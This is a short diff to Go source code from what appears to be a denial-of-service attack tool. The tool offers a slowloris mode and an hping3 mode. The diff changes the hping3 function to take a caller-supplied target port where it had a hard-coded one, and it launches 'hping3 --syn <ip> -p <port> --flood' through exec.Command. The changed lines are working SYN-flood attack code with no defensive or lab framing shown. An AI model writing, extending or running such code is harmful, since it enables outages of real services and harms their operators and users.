@@ -95,7 +95,7 @@ func attackDDoS(ip string, port string) {
 		slowloris(ip + ":" + port)
 	case 2:
 		fmt.Println("------------------------Starting hping3 flooding Attack------------------------")	
-		hping3(ip)
+		hping3(ip, port)
 	}
 
 }
@@ -143,8 +143,8 @@ func ddosmain(url string) {
 	}
 }
 
-func hping3(ip string) {
-	_, err := exec.Command("hping3", "--syn", ip, "-p", "9999", "--flood").Output()
+func hping3(ip string, port string) {
+	_, err := exec.Command("hping3", "--syn", ip, "-p", port, "--flood").Output()
 	if err != nil {
 		log.Fatal(err)
 	}
